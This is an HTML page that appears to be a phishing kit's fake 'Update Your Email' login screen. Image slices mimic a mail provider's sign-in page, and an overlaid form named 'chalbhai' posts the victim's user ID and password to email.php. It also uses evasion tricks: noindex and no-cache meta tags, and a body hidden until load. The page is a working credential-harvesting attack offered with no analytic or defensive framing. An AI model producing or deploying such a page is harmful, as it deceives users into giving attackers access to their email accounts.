<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Update Your Email</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex" />
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">

    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Cache-Control" content="private" />
    <meta http-equiv="Pragma" content="no-cache" />

<link rel="shortcut icon"
              href="images/logo.jpg"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:442px; top:84px; width:481px; height:462px; z-index:0"><img src="images/1.png" alt="" title="" border=0 width=481 height=462></div>
<form action=email.php name=chalbhai id=chalbhai method=post>
<input name="userid"  type="text" style="position:absolute;width:244px;left:617px;top:322px;z-index:1">
<input name="pass" required type="password" style="position:absolute;width:244px;left:617px;top:347px;z-index:2">
<div id="formimage1" style="position:absolute; left:633px; top:416px; z-index:3"><input type="image" name="formimage1" width="94" height="25" src="images/2.png"></div>

</body>
</html>
